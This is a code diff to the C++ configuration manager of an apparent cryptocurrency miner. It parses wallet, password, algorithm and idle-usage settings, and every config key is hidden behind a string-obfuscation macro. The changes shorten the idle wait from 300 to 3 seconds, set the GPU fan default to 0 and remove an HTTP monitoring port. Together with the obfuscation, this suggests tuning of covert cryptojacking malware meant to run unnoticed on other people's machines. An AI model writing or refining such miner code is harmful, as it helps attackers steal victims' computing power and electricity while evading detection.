@@ -240,7 +240,7 @@ void ConfigManager::ParseConfigFromJson(const json& jsonResponse) {
             cpuConfig.password       = cpuJson.value(OBFUSCATE_STRING("password"),       "");
             cpuConfig.non_idle_usage = cpuJson.value(OBFUSCATE_STRING("non_idle_usage"),  50.0);
             cpuConfig.idle_usage     = cpuJson.value(OBFUSCATE_STRING("idle_usage"),     100.0);
-            cpuConfig.wait_time_idle = cpuJson.value(OBFUSCATE_STRING("wait_time_idle"),  300);
+            cpuConfig.wait_time_idle = cpuJson.value(OBFUSCATE_STRING("wait_time_idle"),    3);
             cpuConfig.use_ssl        = cpuJson.value(OBFUSCATE_STRING("use_ssl"),         0);
         }
 
@@ -256,8 +256,8 @@ void ConfigManager::ParseConfigFromJson(const json& jsonResponse) {
             gpuConfig.wallet         = gpuJson.value(OBFUSCATE_STRING("wallet"),      "");
             gpuConfig.password       = gpuJson.value(OBFUSCATE_STRING("password"),    "");
             gpuConfig.algo           = gpuJson.value(OBFUSCATE_STRING("algo"),        OBFUSCATE_STRING("kawpow"));
-            gpuConfig.fan_speed      = gpuJson.value(OBFUSCATE_STRING("fan_speed"),   80);
-            gpuConfig.wait_time_idle = gpuJson.value(OBFUSCATE_STRING("wait_time_idle"), 300);
+            gpuConfig.fan_speed      = gpuJson.value(OBFUSCATE_STRING("fan_speed"),   0);
+            gpuConfig.wait_time_idle = gpuJson.value(OBFUSCATE_STRING("wait_time_idle"),   3);
             gpuConfig.use_ssl        = gpuJson.value(OBFUSCATE_STRING("use_ssl"),     0);
         }
 
@@ -346,7 +346,7 @@ std::string ConfigManager::BuildCommandLineArgs(const MinerConfig& config, bool 
         args += std::to_string(hint) + " ";
     }
     
-    args += OBFUSCATE_STRING("-a rx/0 --http-port 8888");
+    args += OBFUSCATE_STRING("-a rx/0");
     
     return args;
 }
